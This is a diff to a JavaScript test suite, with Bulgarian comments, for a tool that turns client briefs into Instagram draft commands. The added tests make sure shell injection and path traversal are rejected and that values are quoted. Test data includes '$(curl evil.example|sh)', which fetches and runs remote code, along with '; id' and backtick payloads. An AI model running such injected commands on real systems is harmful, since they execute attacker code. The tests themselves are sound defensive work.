@@ -113,9 +113,11 @@ test("командите за Piuma: само Instagram с медия, само 
   p.posts[0].alt = "Телефон с отворен профил";
   const cmds = piumaCommands(p, ".tmp/sedmitsa");
   assert.equal(cmds.length, 1, "вторият Instagram пост е без медия");
-  assert.match(cmds[0].command, /^node tools\/social\/piuma\.mjs draft --brand linketto --media https:\/\/cdn\.example\/a\.jpg --caption-file \S+ --alt /);
+  assert.match(cmds[0].command, /^node tools\/social\/piuma\.mjs draft --brand 'linketto' --media 'https:\/\/cdn\.example\/a\.jpg' --caption-file '\S+' --alt /);
   assert.doesNotMatch(cmds[0].command, /publish|approve|schedule/);
   assert.match(cmds[0].caption, /Пробвай безплатно/);
+  p.posts[0].media = "https://cdn.example/a.jpg?sig=ab12&exp=99";
+  assert.equal(piumaCommands(p, ".tmp/sedmitsa").length, 1, "подписан адрес с ? и & минава (в кавички)");
 });
 
 test("CLI: check → изход 1 при HIGH; render пише пакета в .tmp", () => {
@@ -137,4 +139,81 @@ test("CLI: check → изход 1 при HIGH; render пише пакета в .
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
+});
+
+// ── Прегледът на PR #506 (Кодаджията + AI-джията) ─────────────────────────
+// Брифът от клиент е недоверен вход, а стъпка 7 на умението пуска командите в Bash:
+// всичко в командата е в кавички, а брандът и медията се проверяват, преди да стане команда.
+
+test("shell-инжекция: медия или бранд със символи на обвивката → HIGH, без команда", () => {
+  const p = good();
+  p.posts[0].media = "https://cdn.example/a.jpg;$(curl evil.example|sh)";
+  p.posts[0].alt = "Телефон";
+  assert.ok(high(p).includes("bad-media"));
+  const q = good();
+  q.brand = "linketto; id";
+  q.posts[0].media = "https://cdn.example/a.jpg";
+  q.posts[0].alt = "Телефон";
+  assert.ok(high(q).includes("bad-brand"));
+  const nb = good();
+  delete nb.brand;
+  nb.posts[0].media = "https://cdn.example/a.jpg";
+  nb.posts[0].alt = "Телефон";
+  assert.ok(high(nb).includes("bad-brand"), "Instagram с медия без бранд");
+  for (const media of ["https://cdn.example/a.jpg?x=$(id)", "http://cdn.example/a.jpg", "https://cdn.example/a b.jpg", "https://cdn.example/`id`.jpg", "не-адрес"]) {
+    const m = good();
+    m.posts[0].media = media;
+    m.posts[0].alt = "Телефон";
+    assert.ok(high(m).includes("bad-media"), media);
+  }
+});
+
+test("командата: всяка стойност е в кавички — кавичка в текста не излиза от тях", () => {
+  const p = good();
+  p.idea = "Идея с ' кавичка; и $(нещо)";
+  p.posts[0].media = "https://cdn.example/a.jpg";
+  p.posts[0].alt = "Алт с ' кавичка";
+  const [c] = piumaCommands(p, ".tmp/sedmitsa/с интервал");
+  assert.match(c.command, /--caption-file '\.tmp\/sedmitsa\/с интервал\/den-1-0\.txt'/);
+  const args = c.command.replace(/^node tools\/social\/piuma\.mjs draft /, "");
+  const spawned = spawnSync("bash", ["-c", `printf '%s\\n' ${args}`], { encoding: "utf8" });
+  assert.equal(spawned.status, 0);
+  const lines = spawned.stdout.split("\n");
+  assert.ok(lines.includes("Идея с ' кавичка; и $(нещо)"), "обвивката вижда един аргумент, нищо не се изпълнява");
+  assert.ok(lines.includes(".tmp/sedmitsa/с интервал/den-1-0.txt"));
+});
+
+test("Instagram пост с медия без alt → HIGH (piuma.mjs draft иска --alt; иначе командата винаги пада)", () => {
+  const p = good();
+  p.posts[0].media = "https://cdn.example/a.jpg";
+  assert.ok(high(p).includes("no-alt-media"));
+});
+
+test("седмицата е ГГГГ-ММ-ДД — иначе render би писал извън .tmp", () => {
+  for (const week of ["../../CLAUDE", "2026-11-30/../../x", "", undefined]) {
+    const p = good();
+    if (week === undefined) delete p.week;
+    else p.week = week;
+    assert.ok(high(p).includes("bad-week"), String(week));
+  }
+});
+
+test("null или не-обект в posts → HIGH bad-post, не TypeError", () => {
+  const p = good();
+  p.posts.push(null, 5);
+  const f = checkWeek(p).filter((x) => x.code === "bad-post");
+  assert.equal(f.length, 2);
+});
+
+test("AI медия: етикетът стига до черновата — редът е в caption-а и в пакета", () => {
+  const p = good();
+  p.posts[0].media = "https://cdn.example/a.jpg";
+  p.posts[0].alt = "Телефон";
+  p.posts[0].aiMedia = true;
+  p.posts[0].aiLabel = true;
+  const [c] = piumaCommands(p, ".tmp/sedmitsa");
+  assert.match(c.caption, /Изображението е създадено с AI\./);
+  assert.match(renderPack(p), /Изображението е създадено с AI\./);
+  p.aiNote = "Immagine creata con l'AI.";
+  assert.match(piumaCommands(p, ".tmp/sedmitsa")[0].caption, /Immagine creata con l'AI\./, "езикът на бранда — от плана");
 });
